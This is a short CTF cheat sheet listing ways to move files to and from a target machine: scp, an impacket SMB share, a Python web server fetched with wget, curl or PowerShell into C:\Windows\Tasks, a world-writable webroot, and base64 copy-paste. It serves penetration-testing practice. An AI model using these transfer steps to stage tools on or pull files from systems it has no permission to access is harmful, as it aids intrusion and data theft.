# File-Transfer
## Collection of File Transfer possibilities

In some CTF's it is useful to have a Plan B if you need to transfer a file from or to a remote machine.

## SCP
The bestcase scenario is scp over a SSH connection.
```bash
scp user@sourceIP:/PATH/file.ext user@destinationIP:/PATH/file.ext
```

## SMBserver
Start a SMBserver in you current directory [.] to copy & paste files back and forth
```bash
sudo impacket-smbserver -smb2support share[NAME] .[/PATH] 
```
Copy from Windows Target
```bash
copy .\file.ext \\sourceIP\share\file.ext
```
Copy to a Windows Target
```bash
copy \\sourceIP\share\file.ext .\file.ext
```
Make sure to stop the SMBserver after transfer because everybody in that network has access to your SMBserver

## Python Server
It is also possible to start a Python3 http.server and transfer some files with wget or IWR.
At the Source
```bash
python3 -m http.server 8080
```
At the destination Linux
```bash
wget http://sourceIP:8080/file.ext
curl http://sourceIP:8080/file.ext -o /PATH/fiile.ext
```
At the destination Windows
```bash
powershell.exe IEX(New-Object Net.WebClient).DownloadFile('http://sourceIP/file.ext','C:\Windows\Tasks\file.ext')
iwr "http://sourceIP/file.ext" -outfile "C:\Windows\Tasks\file.ext"
```
## HTML
If your target has a public facing Webpage you can use it to download the files.
```bash
cp *.ext /var/www/html/
chmod 0777 /var/www/html/*.ext
http://source.URL/file.ext
```

## Base64
If all else fails, there is always plan y. <br>
Convert a file or program to a Base64 string copy & paste it to the Target and deconvert it. <br>
<br>
On Linux
```bash
base64 file.ext > fileb64.txt
cat fileb64.txt
```
On Windows
```bash
[convert]::ToBase64String((Get-Content -path "file.ext" -Encoding byte))
```
Copy the Base64 string.
```bash
vim string.b64
```
Paste the string to any Text-Editor.
```bash
base64 -d string.b64 > file.ext
```
